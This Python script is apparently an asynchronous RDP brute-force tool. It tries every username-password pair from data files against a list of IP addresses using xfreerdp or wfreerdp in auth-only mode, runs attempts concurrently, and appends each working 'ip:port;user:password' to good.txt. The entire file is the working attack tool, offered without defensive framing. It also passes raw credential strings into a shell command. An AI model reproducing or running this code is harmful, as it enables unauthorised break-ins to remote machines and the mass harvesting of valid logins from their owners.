import asyncio
from asyncio import create_subprocess_shell as run
from asyncio.subprocess import DEVNULL
from platform import system as sys_ver

from aiofiles import open as afile
from async_timeout import timeout as ftime


# OS Detect
if sys_ver() == 'Windows':
    fr_name = 'wfreerdp.exe'
else:
    fr_name = 'xfreerdp'


async def connect(ip: str, user: str, password: str) -> str:
    r_agr = f"{fr_name} /v:{ip} /port:{PORT} /u:'{user}' " + \
            f"/p:'{password}' /cert-ignore +auth-only " + \
            '+compression /sec:nla'

    a = await run(r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)

    try:
        async with ftime(TIMEOUT):
            await a.communicate()

        assert a.returncode == 0

        rez = f'{ip}:{PORT};{user}:{password}\n'

        async with afile(f'good.txt', 'a', encoding='utf-8',
                         errors='ignore') as f:
            await f.write(rez)

        return 'g'
    except Exception:
        await a.kill()


async def start() -> None:
    good = 0
    total = 0
    tasks = []

    async with afile('data/users.txt', errors="ignore",
                     encoding="utf-8") as users:
        async for user in users:
            async with afile('data/passwords.txt', errors="ignore",
                             encoding="utf-8") as passws:
                async for passw in passws:
                    async with afile('data/ip.txt', errors="ignore",
                                     encoding="utf-8") as ips:
                        async for ip in ips:
                            tasks.append(asyncio.create_task(connect(
                                ip.strip(),
                                user.strip(),
                                passw.strip()
                            )))

                            if len(tasks) == THREADS:
                                for rez in await asyncio.gather(*tasks):
                                    if rez:
                                        good += 1

                                    total += 1

                                print(f'Good: {good}; Total: {total}', end='\r')
                                tasks = []

    if len(tasks) != 0:
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    THREADS = int(input('Threads: '))
    TIMEOUT = int(input('Timeout: '))
    PORT = int(input('Port: ') or 3389)

    loop = asyncio.new_event_loop()
    loop.run_until_complete(start())
    loop.close()
